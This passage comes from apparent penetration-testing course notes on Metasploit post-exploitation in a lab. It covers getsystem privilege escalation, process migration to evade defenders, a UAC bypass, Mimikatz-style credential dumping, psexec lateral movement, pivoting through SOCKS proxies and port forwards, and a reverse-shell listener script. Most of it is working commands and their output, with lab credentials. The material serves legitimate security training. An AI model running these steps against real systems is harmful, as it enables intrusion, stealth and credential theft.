  2365. System Language : en_US
  2366. Domain : WORKGROUP
  2367. Logged On Users : 3
  2368. Meterpreter : x64/windows
  2369. meterpreter &gt; idletime
  2370. User has been idle for: 26 mins 21 secs
  2371. meterpreter &gt;
  2372. </code></pre>
  2373. <p>The output states that the user has not interacted with the sys for over 26 min, suggesting they stepped away from their computer. If the results of idletime indicated the user is away, we can take this as an opportunity to exec programs or commands which may display a cli-window, CMD or PS, for a moment.</p>
  2374. <p>Several post-exploitation features need admin privs to exec, Metasploit contains a <code>getsystem</code> command, that attempts to auto PrivEsc to NT AUTHORITY\SYSTEM. It utlizes various techniques using named pipe impersonation and token duplication. In default settings, <code>getsystem</code> uses all available techiniques shown in the help menu, attempting to leverage SeImersonatePrivilege and SeDebugPrivilege.</p>
  2375. <p>Before we exec <code>getsystem</code> let&#39;s start an interactive shell and confirm that our user has one of those two privs assigned.</p>
  2376. <pre><code>
  2377. meterpreter &gt; shell

  2402. <ul>

  2404. </ul>
  2405. <p>Now let&#39;s use <code>getsystem</code> to attempt to elevate our privs.</p>
  2406. <pre><code>
  2407. meterpreter &gt; getuid
  2408. Server username: ITWK01\luiza
  2409. ​
  2410. meterpreter &gt; getsystem
  2411. ...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
  2412. ​

  2415. </code></pre>
  2416. <ul>
  2417. <li><code>getsystem</code> elevated our privs to NT AUTHORITY\SYSTEM by using Named Pipe Impersonation (Print Spooler variant) as we did manually in the Windows Privilege Escalation Module.</li>
  2418. </ul>
  2419. <p>Another important post module feature is <code>migrate</code>. When we compromise a host, our Meterpreter payload is executed inside the process of the application we attack or exec our payload. If the victim stops that process we loose our access to the machine. Also, depending on how the binary file containing the Meterpreter payload is named, the proc may appear suspiscious to a defender searching through proc list. We can use migrate to move the execution of our Meterpreter payload to a different proc.</p>
  2420. <p>We can view all running procs with <code>ps</code> in the Meterpreter prompt.</p>
  2421. <pre><code>
  2422. meterpreter &gt; ps
  2423. ​
  2424. Process List
  2425. ============
  2426. ​
  2427. PID PPID Name Arch Session User Path
  2428. --- ---- ---- ---- ------- ---- ----
  2429. 2012 8500 met.exe x64 0 ITWK01\luiza C:\Users\luiza\met.exe
  2430. ...
  2431. 5292 4892 OneDrive.exe x64 1 ITWK01\offsec C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
  2432. ...
  2433. </code></pre>
  2434. <ul>
  2435. <li>The proc <code>met.exe</code> has the proc ID 2012.</li>
  2436. <li>The name and path will stand out to a reviewing defender.</li>
  2437. </ul>
  2438. <p>The output shows <code>offsec</code> started a proc related to OneDrive with proc ID 5292. If our payload runs in this proc, it will be less likely to be detected by reviewing the proc list.</p>
  2439. <p>We should be aware that we are only able to migrate into a proc that executes at the same (or lower) integrity and priv level than of our current proc. In the context of this example, we already gained NT AUTHROTIY/SYSTEM so we have numerous choices.</p>
  2440. <p>Let&#39;s migrate our current proc into the <code>OneDrive.exe</code> of the user <code>offsec</code> by entering <code>migrate</code> and the proc ID we want to migrate to.</p>
  2441. <pre><code>
  2442. meterpreter &gt; migrate 5292
  2443. [*] Migrating from 2012 to 5292...
  2444. [*] Migration completed successfully.
  2445. meterpreter &gt; ps
  2446. ​
  2447. Process List
  2448. ============
  2449. PID PPID Name Arch Session User Path
  2450. --- ---- ---- ---- ------- ---- ----
  2451. ...
  2452. 2440 668 svchost.exe
  2453. 2472 668 svchost.exe
  2454. 2496 668 svchost.exe
  2455. 2568 668 svchost.exe
  2456. 2624 668 spoolsv.exe
  2457. 2660 668 svchost.exe
  2458. 2784 668 svchost.exe
  2459. 2928 668 svchost.exe
  2460. ...
  2461. </code></pre>
  2462. <ul>
  2463. <li>We succesfully migrated our proc to the OneDrive proc.</li>
  2464. </ul>
  2465. <p>When we review the proc list, our original <code>met.exe</code> proc doesn&#39;t exist anymore. Further, we notice that <code>ps</code> output contains less info than before. Reason being, we are now running in the context of the proc with the ID 8052 and therefore as user <code>offsec</code>.</p>
  2466. <pre><code>
  2467. meterpreter &gt; getuid
  2468. Server username: ITWK01\offsec
  2469. </code></pre>
  2470. <p>Instead of migrating to an existing proc or situation in which we won&#39;t find a suitable proc for migration, we can use the <code>execute</code> Meterpreter command. This command procides the ability to create a new proc, specifying a command or program.</p>
  2471. <p>To demonstrate, let&#39;s start a hidden Notepad proc and migrate to it as user <code>offsec</code>. We use <code>execute</code> with <code>-H</code> to create the proc hidden from view and <code>notepad</code> as arg for <code>-f</code> to specify the command or program to run, then migrate to the spawned proc.</p>
  2472. <pre><code>
  2473. meterpreter &gt; execute -H -f notepad
  2474. Process 3500 created.
  2475. meterpreter &gt; migrate 3500
  2476. [*] Migrating from 5292 to 3500...
  2477. [*] Migration completed successfully.
  2478. meterpreter &gt;
  2479. </code></pre>
  2480. <ul>
  2481. <li>Shows we migrated to the newly spawned Notepad proc.</li>
  2482. <li>Spawned without GUI, <code>-H</code></li>
  2483. <li>Still listed in the proc list.</li>
  2484. </ul>
  2485. <p><em>Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which dumps the contents of the SAM database or screenshare, which displays the target machine&#39;s desktop in real-time.</em></p>
  2486. <h5>Post-Exploitation Modules</h5>
  2487. <p>In addition to the core functions of Meterpreter, there are several post modules we can deploy against an active session.</p>
  2488. <p>Sessions created through attack vectors, the execution of a client side attck for instance, will likely only provide us with an unpriv shell. If the target user is a member of the local admin group, we can elevate our shell to a high integrity level if we can bypass <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">User Account Control (UAC)</a>.</p>
  2489. <p>In the previous section we migrated Meterpreter to a OneDrive.exe proc, preumably running at medium integrity. For this section repeat the steps from the prior section and then bypass UAC with a Metasploit post module to obtain a session in the context of a high integrity level proc.</p>
  2490. <p>We first connect to the bind shell on port 4444 of TKWK01, download <code>met.exe</code>, and enter <code>getsystem</code> to elev privs. Then use <code>ps</code> to identify the proc ID of OneDrive.exe and <code>migrate</code> to it.</p>

  2548. <p>While this is an admin account, UAC prevents us from performing admin ops as we learned in prior modules. Before attempting UAC bypass, confirm that the current proc has integrity level Medium.</p>
  2549. <p>To diplay the integrity level of a proc, we can use tools such as <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> or 3rd-party PowerShell modules such as <a href="https://www.powershellgallery.com/packages/NtObjectManager/1.1.33">NtObjectManager</a>. Assume the later is installed on the system already.</p>
  2550. <p>Once we import the module with <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2">Import-Module</a> we use <code>Get-NtTokenIntegrityLevel</code> to display the integrity level of the current proc by retrieving and reviewing the assigned access token.</p>

  2612. <ul>
  2613. <li>The search yields a few results.</li>
  2614. <li>And effective UAC bypass on moder Win sys is <code>exploit/windows/local/bypassuac_sdclt</code></li>
  2615. <li>Targets the MS bin <code>sdclt.exe</code></li>
  2616. <li>Can bypass UAC by spawning a proc with integrity level High.</li>
  2617. </ul>
  2618. <p>To use the mod we activate it and set the <code>SESSION</code> and <code>LHOST</code> options. Setting the SESSION for a post mod allows us to directly exec the exploit on the active session. Enter <code>run</code> to launch the module.</p>

  2709. <li>The proc of our payload runs in has the integrity level High and we have therefore bypassed UAC.</li>
  2710. </ul>
  2711. <p>Besides being able to BG the active session and execute module through it, we can load modules through it, we can also load extensions directly inside the active session with the <code>load</code> command.</p>
  2712. <p>A great example is Kiwi, which is a Meterpreter extension providing Mimikatz capabilities. Mimikatz requires SYSTEM, let&#39;s exit the current Meterpreter session, start the listener again, and exe <code>met.exe</code> as user <code>luiza</code> in the bind shell then enter <code>getsystem</code>.</p>

  2718. [*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jzbq1suw) Attaching orphaned/stageless session...
  2719. [*] Meterpreter session 4 opened (192.168.45.182:443 -&gt; 192.168.226.223:52810) at 2023-11-23 13:05:09 -0800
  2720. ​

  2722. ...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

  2724. <p>Enter <code>load</code> with <code>kiwi</code> as arg to load the Kiwi mod and use <code>help</code> to display the commands of the Kiwi module. Use <code>creds_msv</code> to retrieve LM and NTLM creds.</p>

  2792. <h5>Pivoting with Metasploit</h5>
  2793. <p>The ability to pivot from on target to another is vital. In Port Redirection and Pivoting, we learned several techniques for pivoting. Instead of perform these manually, we can also use Metasploit to perform them.</p>
  2794. <p>As we did previously, we&#39;ll connect to a bind shell on port 4444 of machine ITWK01. Assume we are currently gathering info on the target, we identify a second network interface.</p>
  2795. <pre><code class="language-bash">
  2796. ┌──(operator@labhost)-[~/OffSec/msf]
  2797. └─$ nc $IT 4444

  2823. <ul>
  2824. <li>The second interface has IP <code>172.16.132.199</code> assigned.</li>
  2825. </ul>
  2826. <p>We can attempt to identify live hosts on this second iface leveraging methods from active information gathering. Before doing so let&#39;s start a Meterpreter shell on our compromised host by downloading and executing <code>met.exe</code> as well as starting the multi/handler.</p>

  2837. <p>Now that we have a session on the target sys, we can background it. To add a route to a network reachable through a compromised host we use <code>route add</code> with the network information and session ID the route applies to. After adding the route we can display routes with <code>route print</code>.</p>
  2838. <pre><code>
  2839. meterpreter &gt; bg

  2854. <ul>
  2855. <li>With a path to the internal subnet we can enumerate.</li>
  2856. </ul>
  2857. <p>We could scan the the whole network for live hosts with a port scan aux mod. This would take some time to complete so we will shorted this step by scanning the only live host in the second network. Instead of setting the value of <code>RHOSTS</code> to <code>172.16.132.0/24</code> as we would when scanning the whole network, we will set it to <code>172.16.132.200</code>. For now we will only scan ports 445 and 3389.</p>
  2858. <pre><code>
  2859. msf6 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp
  2860. msf6 auxiliary(scanner/portscan/tcp) &gt; set RHOSTS 172.16.132.200
  2861. RHOSTS =&gt; 172.16.132.200
  2862. msf6 auxiliary(scanner/portscan/tcp) &gt; set PORTS 445,3389
  2863. PORTS =&gt; 445,3389
  2864. msf6 auxiliary(scanner/portscan/tcp) &gt; run
  2865. ​
  2866. [+] 172.16.132.200: - 172.16.132.200:445 - TCP OPEN
  2867. [+] 172.16.132.200: - 172.16.132.200:3389 - TCP OPEN
  2868. [*] 172.16.132.200: - Scanned 1 of 1 hosts (100% complete)
  2869. [*] Auxiliary module execution completed
  2870. </code></pre>
  2871. <ul>
  2872. <li>Shows that 172.16.132.200 has ports 445 and 3389 open.</li>
  2873. <li>Let&#39;s use two mods for SMB and RDP using out pivot host ITWK01 to perform operations on the target.</li>
  2874. </ul>
  2875. <p>First we use psexec mod to get access to the second target as <code>luiza</code>. Previously we retrieved NTLM hash via Kiwi, assume we cracked it and retrieved the clear text password <code>BoccieDearAeroMeow1!</code>. For psexec to succeed <code>luiza</code> must be local admin on the second machine. For the example, assume we confirmed that through information gathering.</p>
  2876. <p>Let&#39;s us <code>exploit/windows/smb/psexec</code> and set <code>SMBUser</code> to <code>luiza</code>, <code>SMBPass</code> to <code>BoccieDearAeroMeow1!</code>, and <code>RHOSTS</code> to <code>172.16.132.200</code>.</p>
  2877. <p>Note that the added route will only work with established connections, so the new shell on the target must be a bind shell such as <code>windows/x64/meterpreter/bind_tcp</code> allowing us to use the set route to connect to it. A reverse shell payload would not be able to route back to our attacking sys because the target does not have a route defined for our network.</p>

  2956. <li>Psexec exploit succeeded in obtaining a Meterpreter shell on the second target via the compromised machine.</li>
  2957. </ul>
  2958. <p>An alternative to adding routes manually is to use the post mod <code>autoroute</code> to setup a pivot through an existing Meterpreter session automatically. To demonstrate, we first need to remove the route we set manually. Let&#39;s terminate the session created through the psexec module and remove all routes with <code>route flush</code>.</p>
  2959. <p>Now the only session is the Meterpreter session created with <code>met.exe</code> as user <code>luiza</code>. The result of <code>route print</code> states that no routes are defined. Next we activate mod <code>multi/manage/autoroute</code> in which we have to set the session ID as value for the option <code>SESSION</code>, then <code>run</code> to launch the module.</p>

  2995. [*] Running module against ITWK01

  2997. [+] Route added to subnet 172.16.132.0/255.255.255.0 from host&#39;s routing table.
  2998. [+] Route added to subnet 192.168.247.0/255.255.255.0 from host&#39;s routing table.
  2999. [*] Post module execution completed
  3000. msf6 post(multi/manage/autoroute) &gt; route print
  3001. ​
  3002. IPv4 Active Routing Table
  3003. =========================
  3004. ​
  3005. Subnet Netmask Gateway
  3006. ------ ------- -------
  3007. 172.16.132.0 255.255.255.0 Session 5
  3008. 192.168.247.0 255.255.255.0 Session 5
  3009. ​
  3010. [*] There are currently no IPv6 routes defined.
  3011. </code></pre>
  3012. <ul>
  3013. <li>Shows autoroute added 172.16.132.0/24 to routing table.</li>
  3014. </ul>
  3015. <p>We can now use the psexec module as we did before, we can also combine routes with the <code>server/socks_proxy</code> aux mod to configure a SOCKS proxy. This allows applications outside of MSF to tunnel through the pivot on port 1080 by default. Set the option <code>SRVHOST</code> to <code>127.0.0.1</code> and <code>VERSION</code> to <code>5</code> for SOCKS5.</p>
  3016. <pre><code>
  3017. msf6 post(multi/manage/autoroute) &gt; use auxiliary/server/socks_proxy
  3018. msf6 auxiliary(server/socks_proxy) &gt; show options
  3019. ​
  3020. Module options (auxiliary/server/socks_proxy):
  3021. ​
  3022. Name Current Setting Required Description
  3023. ---- --------------- -------- -----------
  3024. SRVHOST 0.0.0.0 yes The local host or network interface to listen on
  3025. . This must be an address on the local machine o
  3026. r 0.0.0.0 to listen on all addresses.
  3027. SRVPORT 1080 yes The port to listen on
  3028. VERSION 5 yes The SOCKS version to use (Accepted: 4a, 5)
  3029. ​
  3030. ​
  3031. When VERSION is 5:
  3032. ​
  3033. Name Current Setting Required Description
  3034. ---- --------------- -------- -----------
  3035. PASSWORD no Proxy password for SOCKS5 listener
  3036. USERNAME no Proxy username for SOCKS5 listener
  3037. ​
  3038. ​
  3039. Auxiliary action:
  3040. ​
  3041. Name Description
  3042. ---- -----------
  3043. Proxy Run a SOCKS proxy server
  3044. ​
  3045. ​
  3046. ​
  3047. View the full module info with the info, or info -d command.
  3048. ​
  3049. msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 127.0.0.1
  3050. SRVHOST =&gt; 127.0.0.1
  3051. msf6 auxiliary(server/socks_proxy) &gt; set VERSION 5
  3052. VERSION =&gt; 5
  3053. msf6 auxiliary(server/socks_proxy) &gt; run -j
  3054. [*] Auxiliary module running as background job 0.
  3055. msf6 auxiliary(server/socks_proxy) &gt;
  3056. [*] Starting the SOCKS proxy server
  3057. </code></pre>
  3058. <ul>
  3059. <li>We can now update our proxychains conf to utilize the SOCKS5 proxy.</li>
  3060. </ul>
  3061. <p>We can now use <code>proxychains</code> to run <code>xfreerdp</code> to obtain GUI access from our Kali sys to target on internal network.</p>
  3062. <pre><code>
  3063. ### --- Increase socket timout of proxychains ---
  3064. ​
  3065. ┌──(operator@labhost)-[~/OffSec/msf]
  3066. └─$ less /etc/proxychains.conf
  3067. ​
  3068. ### Some timeouts in milliseconds
  3069. tcp_read_time_out 30000
  3070. tcp_connect_time_out 30000
  3071. ​
  3072. ### --- Proxy to internal RDP ---
  3073. ​
  3074. ┌──(operator@labhost)-[~/OffSec/msf]
  3075. └─$ sudo proxychains xfreerdp /v:172.16.128.200 /u:luiza
  3076. </code></pre>
  3077. <ul>
  3078. <li>Increase socket timeout if proxy conn fails.</li>
  3079. <li>We have successfully pivoted through compromised host.</li>
  3080. </ul>
  3081. <p>We can use a similar technique for port forwarding with the <code>portfwd</code> command within the Meterpreter session, which forwards a port to the internal network.</p>
  3082. <pre><code>
  3083. msf6 auxiliary(server/socks_proxy) &gt; sessions -i 42
  3084. [*] Starting interaction with 42...
  3085. ​
  3086. meterpreter &gt; portfwd -h
  3087. Usage: portfwd [-h] [add | delete | list | flush] [args]
  3088. ​
  3089. ​
  3090. OPTIONS:
  3091. ​
  3092. -h Help banner.
  3093. -i Index of the port forward entry to interact with (see the &quot;list&quot; command).
  3094. -l Forward: local port to listen on. Reverse: local port to connect to.
  3095. -L Forward: local host to listen on (optional). Reverse: local host to connect to.
  3096. -p Forward: remote port to connect to. Reverse: remote port to listen on.
  3097. -r Forward: remote host to connect to.
  3098. -R Indicates a reverse port forward.
  3099. </code></pre>
  3100. <p>We create a local port forward from 4389 localhost to 3389 of the target host.</p>
  3101. <pre><code>
  3102. meterpreter &gt; portfwd add -l 4389 -p 3389 -r 172.16.128.200
  3103. [*] Forward TCP relay created: (local) :4389 -&gt; (remote) 172.16.128.200:3389
  3104. </code></pre>
  3105. <p>We can test by connecting to <code>127.0.0.1:4389</code> with <code>xfreerdp</code>.</p>
  3106. <pre><code class="language-bash">
  3107. ┌──(operator@labhost)-[~/OffSec/msf]
  3108. └─$ xfreerdp /v:127.0.0.1:4389 /u:luiza /timeout:20000
  3109. </code></pre>
  3110. <h4>20.4 Automating Metasploit</h4>
  3111. <ul>
  3112. <li>Create resource scripts.</li>
  3113. <li>Use <a href="https://docs.rapid7.com/metasploit/resource-scripts/">resource scripts</a> in Metasploit.</li>
  3114. </ul>
  3115. <h5>Resource Scripts</h5>
  3116. <p>MSF resource scripts chain together a series of console comands and Ruby code. We can use either built-in commands of Metasploit or write Ruby code to manage control flow and develop advanced logic components.</p>
  3117. <p>In a pentest we may need to setup several multi/handler listeners each time we want to receive an incoming reverse shell. We could let Metasploit run in the background the whole time or start Metasploit and manually start a listener each time. We could also create a resource script to automate this.</p>
  3118. <p>Let&#39;s create a script that starts a multi/handler listener for a non-staged Win x64 Meterpreter payload. To do this we create a file in home dir of Kali named <code>listener.rc</code> and open it a text editor.</p>
  3119. <p>We first need to determine the command sequence we want to use. In this example, the first command activates the multi/handler module. Next we set the payload, <code>windows/meterpreter_reverse_https</code>, the we set our <code>LHOST</code> and <code>LPORT</code> options.</p>
  3120. <pre><code>
  3121. use exploit/multi/handler
  3122. set PAYLOAD windows/meterpreter_reverse_https
  3123. set LHOST 192.168.119.4
  3124. set LPORT 443
  3125. </code></pre>
  3126. <p>Additionally we can configure the <code>AutoRunScript</code> option to automatically exec a mod after a session is created. In this example we will use <code>post/windows/manage/migrate</code> module. This will cause the spawned Meterpreter to automatically launch a background <code>notepad.exe</code> process to migrate to. Automating process migration helps to avoid situations where our payload is killed prematurely by defensive technology or termination of the process.</p>
  3127. <pre><code>
  3128. set AutoRunScript post/windows/manage/migrate
  3129. </code></pre>
  3130. <p>We also set <code>ExitOnSession</code> to <code>false</code> to ensure that the listener keeps accepting new connections after a session is created.</p>
  3131. <pre><code>
  3132. set ExitOnSession false
  3133. </code></pre>
  3134. <p><em>We can also configure advanced options such as ExitOnSession in multi/handler and AutoRunScript in payloads by using show advanced within the activated module or selected payload.</em></p>
  3135. <p>Finally we add <code>run</code> with args <code>-z -j</code> to run it as a job in the bg and stop us from automatically interacting with the session.</p>
  3136. <pre><code>
  3137. run -z -j
  3138. </code></pre>
  3139. <p>Save the script and start Metasploit by passing the resource script as arg for <code>-r</code>.</p>
  3140. <pre><code class="language-bash">
  3141. sudo msfconsole -r listener.rc
  3142. </code></pre>
  3143. <p>Or import it into a running session.</p>
  3144. <pre><code>
  3145. msf6 &gt; resource listener.rc
  3146. [*] Processing /home/operator/OffSec/msf/listener.rc for ERB directives.
  3147. resource (/home/operator/OffSec/msf/listener.rc)&gt; use exploit/multi/handler
  3148. [*] Using configured payload windows/x64/meterpreter_reverse_https
  3149. resource (/home/operator/OffSec/msf/listener.rc)&gt; set PAYLOAD windows/meterpreter_reverse_https
  3150. PAYLOAD =&gt; windows/meterpreter_reverse_https
  3151. resource (/home/operator/OffSec/msf/listener.rc)&gt; set LHOST 192.168.45.207
  3152. LHOST =&gt; 192.168.45.207
  3153. resource (/home/operator/OffSec/msf/listener.rc)&gt; set LPORT 443
  3154. LPORT =&gt; 443
  3155. resource (/home/operator/OffSec/msf/listener.rc)&gt; set AutoRunScript post/windows/manage/migrate
  3156. AutoRunScript =&gt; post/windows/manage/migrate
  3157. resource (/home/operator/OffSec/msf/listener.rc)&gt; set ExitOnSession false
  3158. ExitOnSession =&gt; false
  3159. resource (/home/operator/OffSec/msf/listener.rc)&gt; run -z -j
  3160. [*] Exploit running as background job 3.
  3161. [*] Exploit completed, but no session was created.
  3162. ​
  3163. [*] Started HTTPS reverse handler on https://192.168.45.207:443
  3164. </code></pre>
  3165. <ul>
  3166. <li>All of our commands were executed from the script.</li>
  3167. </ul>
  3168. <p>let&#39;s connect to BRUTE2 via RDP with user <code>justin</code> and password <code>SuperS3cure1337#</code>, start PowerShell, download our mal Win bin <code>met.exe</code> that we used previously.</p>
  3169. <pre><code>
  3170. [!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
  3171. [*] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Redirecting stageless connection from /FNYmHRbQWmG7KLoq3kt59QhAdFPJvMnkV2S9mtqTtNlFmz-DxmF6tOosWU1xpKfaFFO2HoI6fTmcJJ8YS with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
  3172. [!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!

  3187. <p>Instead of creating our own resource scripts we can use the scripts provided by Metasploit found in <code>/usr/share/metasploit-framework/scripts/resource</code>.</p>
  3188. <pre><code class="language-bash">
  3189. ┌──(operator@labhost)-[~/OffSec/msf]
  3190. └─$ ls -l /usr/share/metasploit-framework/scripts/resource

  3221. <ul>
  3222. <li>There are resource scripts provided for.</li>
  3223. <li>Port scanning.</li>
  3224. <li>Brute forcing.</li>
  3225. <li>Protocol enumerations.</li>
  3226. <li>And many more.</li>
  3227. <li>Before using them.</li>
  3228. <li>Examine.</li>
  3229. <li>Understand.</li>
  3230. <li>Modify to fit our needs.</li>
  3231. </ul>
  3232. <p>Some scripts use the global datastore of Metasploit to set options like <code>RHOSTS</code>. When we use <code>set</code> or <code>unset</code> we define options in the context of a running module. We can also define values for options across all mods by setting <em>global</em> options, with <code>setg</code> and <code>unsetg</code>.</p>
  3233. <p>Resource scripts can automate parts of pentests. We can create a set of resource scripts for repetative tasks and operations. We can prepare those scripts and then modify them for each pentest. Example, we can prepare resource scripts for listeners, pivoting, post-exploitation, etc. Using them for multiple tests can save a lot of time.</p>
